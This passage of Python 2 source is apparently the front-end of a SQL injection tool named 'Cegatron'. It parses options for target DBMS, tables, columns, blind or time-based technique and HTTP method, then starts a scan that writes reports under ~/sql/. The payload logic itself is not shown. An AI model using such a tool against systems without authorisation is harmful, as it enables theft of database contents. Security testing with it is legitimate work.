				exit(1)
			inject.setDBMS(vals)
		#Get table specified
		elif opt == '--tables':
			try:
				tbles = vals.split(',')
			except:
				tbles="all"
			inject.searchColumns(True)
			inject.setTables(tbles)
		#Get column specified
		elif opt == '--columns':
			try:
				clumns = vals.split(',')
			except:
				clumns="all"
			inject.searchRecords(True)
			inject.setColumns(clumns)
		# User define which Technique will be used
		elif opt == '--based':
			inject.setBased(vals)
		elif opt == '--time':
			inject.setTime(vals)
		#Option not valid
		elif opt == '--success':
			inject.setSuccess(vals)
		elif opt == '--error':
			inject.setError(vals)
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
				exit(1)
		else:
			print '<{0} -h for help'.format(argv[0])
			exit(1)
	else:
		main()

def Cancelar(w="",wait=0.05):
	stdout.write(w)
	sleep(wait)
	stdout.flush()

def main():
	# Create Directory and Files used for reporting
	try:
		inject.CreateFiles()
		inject.Begin()
	except KeyboardInterrupt:
		print ""
		for c in "Cancelling scanning....":
			Cancelar("\033[1;31m"+c+"\033[0m")
		print ""
		exit(1)

if __name__ == "__main__":
	try:
		print "\t"*2,"%"*28,"\n","\t"*2,"%"*5,"!!! Cegatron !!!","%"*5,"\n","\t"*2,"%"*5," Becarios Team  ","%"*5,"\n","\t"*2,"%"*28
		if isdir(getenv("HOME")+"/sql/"):
			pass
		else:
			try:
				p = getenv("HOME")+"/sql/"
				mkdir(p)
			except:
				pass
		inject = Injection()
		Opciones(argv)
	except KeyboardInterrupt:
		print ""
		for c in "Cancelling scanning....":
			Cancelar("\033[1;31m"+c+"\033[0m")
		print ""
		exit(1)
